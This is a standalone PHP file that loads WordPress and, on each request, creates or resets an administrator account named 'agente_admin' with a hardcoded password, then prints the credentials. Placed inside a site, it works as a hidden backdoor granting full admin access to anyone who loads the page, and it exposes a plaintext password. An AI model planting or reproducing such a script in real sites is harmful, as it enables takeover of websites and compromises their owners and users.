<?php
require_once dirname( __FILE__, 4 ) . '/wp-load.php';

$username = 'agente_admin';
$password = 'Agente2026Bttr_Sec!';
$email    = 'agente@bttr.pe';

if ( ! username_exists( $username ) ) {
    $user_id = wp_create_user( $username, $password, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    echo "NUEVO: $username / $password";
} else {
    $user = get_user_by( 'login', $username );
    wp_set_password( $password, $user->ID );
    echo "ACTUALIZADO: $username / $password";
}
